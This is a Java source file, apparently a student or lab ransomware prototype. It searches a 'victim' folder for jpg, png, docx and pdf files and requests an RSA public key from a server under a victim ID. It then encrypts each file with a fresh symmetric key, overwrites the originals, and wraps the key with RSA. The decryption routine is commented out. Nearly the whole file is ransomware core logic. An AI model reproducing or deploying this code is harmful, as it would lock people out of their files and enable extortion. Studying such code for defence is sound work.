
import java.io.BufferedInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Path;
import java.security.Key;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Scanner;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
/**
 *
 * @author 20175707
 */
public class TestEnc {
    public static void main(String args[])
        throws NoSuchAlgorithmException, InstantiationException, IllegalAccessException, IOException, Exception {
        
        // decide which file type to find
        String glob = "glob:**/*.{jpg,png,docx,pdf}";
	// starting location of the search 	
        //String startingLocation = "C:/";
        String startingLocation = "/Users/admin/Desktop/victim";
        
        // Creating a FileFinder and saving the paths and iv of the found files
        FileFinder fileFind = new FileFinder();
        fileFind.findFiles(glob, startingLocation);
        final HashMap<IvParameterSpec, Path> IvAndFile = fileFind.fileFound;
        
        // Get Public Key
        String uniqueId = "victim47"; 
        ServerCommunication communicator = new ServerCommunication();
        PublicKey publicRSAKey = communicator.getPublicKeyFromServer(uniqueId);
        
        // generate symmetric key
        SymmetricKey symKey = SymmetricKey.getSymmetricKey();
        
        // Creating an EncryptionDecryption object
        EncryptionDecription encDec = new EncryptionDecription();
        
        // Encrypting every file
        Iterator<Entry<IvParameterSpec, Path>> itEnc = IvAndFile.entrySet().iterator();
        while (itEnc.hasNext()) {
            Map.Entry<IvParameterSpec, Path> ivPath = (Map.Entry<IvParameterSpec, Path>) itEnc.next();
            byte[] content = encDec.getBytesFile(ivPath.getValue());
            byte[] encrypted = encDec.encryptBytesFile(symKey.getSessionKey(), ivPath.getKey(), content);
            // Saving the encrypted file
            encDec.bytesToFile(encrypted, ivPath.getValue());
        }
        
        // Encrypt symmetric key
        byte[] encryptedSymKey = symKey.encryptKey(publicRSAKey);
        
        // Getting private RSA key
        Scanner scan = new Scanner(new BufferedInputStream(System.in));
        String secretRSAKeyString = "";
        System.out.println("Enter RSA private key:"); 
        //while (scan.hasNext()) {
        //    secretRSAKeyString = secretRSAKeyString + scan.nextLine(); 
        //}
        
        //secretRSAKeyString = secretRSAKeyString.replaceAll("\\n", "")
          //          .replace("-----BEGIN RSA PRIVATE KEY-----", "")
            //        .replace("-----END RSA PRIVATE KEY-----", "");
        
        /*
        KeyFactory kf = KeyFactory.getInstance("RSA");
        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(Base64.getDecoder()
                .decode(secretRSAKeyString.getBytes()));
        PrivateKey secretRSAKey = kf.generatePrivate(keySpec);
        
        // Decrypt symmetric key
        SecretKey decSymmetricKey = symKey.decryptKey(secretRSAKey, encryptedSymKey);
            
        // Decrypting every file
        Iterator<Entry<IvParameterSpec, Path>> itDec = IvAndFile.entrySet().iterator();
        while (itDec.hasNext()) {
            Map.Entry<IvParameterSpec, Path> ivPath = (Map.Entry<IvParameterSpec, Path>) itDec.next();
            byte[] content = encDec.getBytesFile(ivPath.getValue());
            byte[] encrypted = encDec.decryptBytesFile(decSymmetricKey, ivPath.getKey(), content);
            // Saving the encrypted file
            encDec.bytesToFile(encrypted, ivPath.getValue());
        }        
*/
        System.out.println("Done");
    }
}